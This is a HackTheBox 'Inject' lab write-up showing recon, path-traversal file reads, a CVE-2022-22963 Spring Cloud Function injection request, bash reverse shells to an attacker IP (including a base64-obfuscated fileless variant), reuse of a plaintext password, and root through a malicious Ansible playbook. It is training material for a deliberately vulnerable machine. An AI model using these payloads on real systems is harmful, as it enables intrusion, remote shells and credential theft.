---
render_with_liquid: false
title: HackTheBox Writeup  Inject
date: 2023-03-25 11:16:29 +1400
tags: [hackthebox, linux, nmap, gobuster, burpsuite, ffuf, directory-traversal, file-read, tomcat, information-disclosure, java, maven, spring-cloud, spring-boot, cve-2022-22963, command-injection, pspy, ansible, ansible-playbook]
---



Inject is an Easy Difficulty Linux machine featuring a website with file upload functionality vulnerable to Local File Inclusion (LFI). By exploiting the LFI vulnerability, files on the system can be enumerated, revealing that the web application uses a specific version of the `Spring-Cloud-Function-Web` module susceptible to `CVE-2022-22963`. Exploiting this vulnerability grants an initial foothold as the `frank` user. Lateral movement is achieved by further file enumeration, which discloses a plaintext password for `phil`. A cronjob running on the machine can then be exploited to execute a malicious `Ansible` playbook, ultimately obtaining a reverse shell as the `root` user.


# Recon

## Nmap

```bash

# Nmap 7.93 scan initiated Sat Mar 25 11:16:28 2023 as: nmap -sVC -p- -Pn -T4 -oA inject -vv 10.10.11.204
Increasing send delay for 10.10.11.204 from 0 to 5 due to 961 out of 2402 dropped probes since last increase.
Increasing send delay for 10.10.11.204 from 5 to 10 due to 34 out of 84 dropped probes since last increase.
Nmap scan report for 10.10.11.204
Host is up, received user-set (0.22s latency).
Scanned at 2023-03-25 11:16:29 EDT for 1311s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HYdFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwUDOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUJSpBOORoHb6HHQkePUztvh85c2F5k5zMDp+hjFhD8VRC2uKJni1FLYkxVPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
|   256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
8080/tcp open  nagios-nsca syn-ack ttl 63 Nagios NSCA
|_http-title: Home
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Mar 25 11:38:20 2023 -- 1 IP address (1 host up) scanned in 1311.80 seconds
```


# Enum


## TCP 8080 - Zodd Cloud

Seems like a static website

![](/assets/obsidian/62155a830984ba0f5944ad74905ebadd.png)

The `login` and `register` function is not implemented

![](/assets/obsidian/66426898c7ef9100557f6c0abfdcf903.png)


### Gobuster

```bash
┌──(root㉿kali)-[~/inject]
└─# gobuster dir -u http://10.10.11.204:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 50 -e -o inject.gobuster
...
http://10.10.11.204:8080/register             (Status: 200) [Size: 5654]
http://10.10.11.204:8080/error                (Status: 500) [Size: 106]
http://10.10.11.204:8080/upload               (Status: 200) [Size: 1857]
http://10.10.11.204:8080/blogs                (Status: 200) [Size: 5371]
http://10.10.11.204:8080/environment          (Status: 500) [Size: 712]
http://10.10.11.204:8080/show_image           (Status: 400) [Size: 194]
http://10.10.11.204:8080/release_notes        (Status: 200) [Size: 1086]
```


### /upload

![](/assets/obsidian/6206a6020c0b03a3530c1a066bd8d225.png)

![](/assets/obsidian/76a922bb5e6b90398ad1451ac19369e7.png)

![](/assets/obsidian/aefb8bd06968215e09f1617121c57b2c.png)

- Checks if the file is image by file extension name only
- The uploaded file will be automatically deleted in about 1 minute

**Fuzzing:** 

```bash
ffuf -u "http://10.10.11.204:8080/show_image?img=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -fc 500
```

**LFI**: `/show_image?img=../../../../../../etc/passwd`

![](/assets/obsidian/672a5c4de7c35e09f731b9ffebdbf74a.png)

Use LFI to get `/etc/passwd`, then get active users

```bash
┌──(root㉿kali)-[~/inject]
└─# cat passwd| grep sh$
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

- Tried `/home/<user>/.ssh/id_rsa` for both `frank` and `phil` but failed

Do further path gathering:

```bash
ffuf -u "http://10.10.11.204:8080/show_image?img=../../../../../..FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fc 500 -o ffuf_lfi.txt
```

At the time I was about to write a script to download files from the output result, I found out that directory listing is possible...

![](/assets/obsidian/51116a1a9de8fe1dca2eb1b44b3c9e31.png)

Get `/show_image` source code : 

```http
GET /show_image?img=../../../../../../../var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java HTTP/1.1
```

```java
    @RequestMapping(value = "/show_image", method = RequestMethod.GET)
    public ResponseEntity getImage(@RequestParam("img") String name) {
        String fileName = UPLOADED_FOLDER + name;
        Path path = Paths.get(fileName);
        Resource resource = null;
        try {
            resource = new UrlResource(path.toUri());
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        return ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);
    }
```

Get `upload` source code:

```java
    @PostMapping("/upload")
    public String Upload(@RequestParam("file") MultipartFile file, Model model){
        String fileName = StringUtils.cleanPath(file.getOriginalFilename());
        if (!file.isEmpty() && !fileName.contains("/")){
            String mimetype = new MimetypesFileTypeMap().getContentType(fileName);
            String type = mimetype.split("/")[0];
            if (type.equals("image")){
                try {
                    Path path = Paths.get(UPLOADED_FOLDER+fileName);
                    Files.copy(file.getInputStream(),path, StandardCopyOption.REPLACE_EXISTING);
                } catch (IOException e){
                    e.printStackTrace();
                }
                model.addAttribute("name", fileName);
                model.addAttribute("message", "Uploaded!");
            } else {
                model.addAttribute("message", "Only image files are accepted!");
            }
            
        } else {
            model.addAttribute("message", "Please Upload a file!");
        }
        return "upload";
    }
```
- Looks like file upload vulnerability is not possible

Interesting Files:
- `../../../../../../../home/frank/.gnupg/trustdb.gpg`

- `../../../../../../../opt/automation/tasks/playbook_1.yml`

```yaml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

Get `pom.xml` :

```http
GET /show_image?img=../../../../../../../var/www/WebApp/pom.xml HTTP/1.1
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```


### /release_notes

![](/assets/obsidian/49c16e8919cd6093b08181ac7d169114.png)


# User Flag
---


## CVE-2022-22963

Search for : `spring cloud 3.2.2 exploit`

- CVE-2022-22963

![](/assets/obsidian/63038ca84be58f7fc3327974a7a53097.png)

**Detail:**
- https://github.com/nomi-sec/PoC-in-GitHub

![](/assets/obsidian/ee2890fd93a24d27aaf551bb53e380d3.png)

**Testing:**

Start a http server:

```bash
┌──(root㉿kali)-[~/inject]
└─# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Intercept and modify the http request:

```http
POST /functionRouter HTTP/1.1
Host: 10.10.11.204:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.9/xd")

xd
```
- Put random post data

Via burp repeater

![](/assets/obsidian/a01036e0a6e1703387e7a942cb1638e2.png)

Success confirmed:

![](/assets/obsidian/58e998e782d6115f64c76ddfefdfcf6a.png)

Prepare reverse shell script:

```bash
mkdir www && cd www
python3 -m http.server 80
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.9/1111 0>&1"' > ok.sh
```

Start Listener:

```bash
┌──(root㉿kali)-[~/inject]
└─# rlwrap nc -lvnp 1111
listening on [any] 1111 ...
```

Since piping `bash` and reverse shell one-liner doesn't work

Send following commands to get reverse shell:
1. `curl 10.10.14.9/ok.sh -o /tmp/qq.sh`
2. `bash /tmp/qq.sh`

Found `.m2` (Marven's config and profile folder)

```bash
frank@inject:/$ id
id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
frank@inject:/$ cd ~
cd ~

frank@inject:~$ ls -la
ls -la
total 28
drwxr-xr-x 5 frank frank 4096 Feb  1 18:38 .
drwxr-xr-x 4 root  root  4096 Feb  1 18:38 ..
lrwxrwxrwx 1 root  root     9 Jan 24 13:57 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
drwx------ 2 frank frank 4096 Feb  1 18:38 .cache
drwxr-xr-x 3 frank frank 4096 Feb  1 18:38 .local
drwx------ 2 frank frank 4096 Feb  1 18:38 .m2
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile

frank@inject:~$ cd .m2
cd .m2

frank@inject:~/.m2$ ls -la
ls -la
total 12
drwx------ 2 frank frank 4096 Feb  1 18:38 .
drwxr-xr-x 5 frank frank 4096 Feb  1 18:38 ..
-rw-r----- 1 root  frank  617 Jan 31 16:55 settings.xml

frank@inject:~/.m2$ cat settings.xml
cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>

```

Switch user to **phil** by login with the password : `DocPhillovestoInject123`

```bash
frank@inject:~/.m2$ su - phil
su - phil
Password: DocPhillovestoInject123
echo $SHELL
/bin/bash
id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)

cat user.txt
39677b8b0c73671eede1ecdf4317acb3
```


# Root Flag
---

## Ansible

According to the result gathered during directory listing stage, check the `/opt` path

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"

phil@inject:/home/phil$ ls -la /opt/automation/tasks/
total 12
drwxrwxr-x 2 root staff 4096 Mar 28 06:00 .
drwxr-xr-x 3 root root  4096 Oct 20 04:23 ..
-rw-r--r-- 1 root root   150 Mar 28 06:00 playbook_1.yml
```

`phil` is in the group of `staff`, can write files to the directory but have no permission to edit `playbook_1.yml`

My hunch told me this is not normal, there must be a way for ansible to run `yml` file as root

Use pspy to monitor processes

Download and run `pspy` at victim machine:

```bash
wget 10.10.14.9/pspy64
chmod +x pspy64
./pspy64
```

There are tasks to automatically setup `ansible` and run `ansible-playbook` to load `/opt/automation/tasks/playbook_1.yml`

![](/assets/obsidian/b7caf9038c63c8e5a0c66aa654b8d260.png)

Look at the root cause of how the task was ran

![](/assets/obsidian/2203d67320466555924442ae58e42881.png)

Ansible will load any `.yml` files as **root** in the `tasks` directory before removing them

```bash
/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml 
```

Using `pwncat-cs` to listen on port 1111

```bash
(local) pwncat$ listen -m linux 1111
[01:51:03] new listener created for 0.0.0.0:1111 
```

Place a `yml` file in the directory to make it run the reverse shell script in `/tmp` which was created at my initial access

```bash
cat << EOF > xd.yml
- hosts: localhost
  tasks:
    - name: QAQ
      command: sudo bash /tmp/qq.sh
EOF
```

Caught the shell after waiting for about 30 seconds:

```bash
(local) pwncat$ sessions
                                     Active Sessions                                     
     ╷      ╷                                  ╷          ╷        ╷                     
  ID │ User │ Host ID                          │ Platform │ Type   │ Address             
 ════╪══════╪══════════════════════════════════╪══════════╪════════╪════════════════════ 
  0  │ phil │ 22dee6740fe3464ef23acecc8e677915 │ linux    │ Bind   │ 10.10.11.204:50596  
  *1 │ root │ 22dee6740fe3464ef23acecc8e677915 │ linux    │ Socket │ 10.10.11.204:55746  

(remote) root@inject:/opt/automation/tasks# cat /root/root.txt 
3f48303a4a490b03d83b9541e9165e86
```

---
![](/assets/obsidian/ff7984ef337157d1c3603b75a5859b75.png)


# Additional
---


## From Ippsec

- Java allows directory listing with path traversal


### Command Injection Fileless RCE

Avoid using bad characters to make get reverse shell without dropping file on target disk

```bash
┌──(root㉿kali)-[~/inject]
└─# echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==
```

```bash
┌──(root㉿kali)-[~/inject]
└─# echo ' bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64 -w0
IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQo=

┌──(root㉿kali)-[~/inject]
└─# echo ' bash -i >& /dev/tcp/10.10.14.6/443 0>&1 ' | base64 -w0
IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK
```

Send this payload

```bash
bash -c {echo,IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK}|{base64,-d}|bash
```


## Failed CVE-2022-22965

Searched for : `spring boot 2.6.5 exploit`

- CVE-2022-22965

![](/assets/obsidian/22e4198b509d481c096d502f6163b480.png)

**Detail:**

![](/assets/obsidian/c222801a875f0a759d4dc7fd01c5fdde.png)

After doing some research on the lab, I verified that the VM is not vulnerable to this exploit:

Vulnerable spring boot project's `pom.xml`:
https://github.com/itsecurityco/CVE-2022-22965/blob/master/pom.xml

How to patch:
https://github.com/itsecurityco/CVE-2022-22965/blob/master/patch.png

In this case, the machine does not meet below requirements to be exploitable:
- Data Binding
- Packaged as Traditional WAR

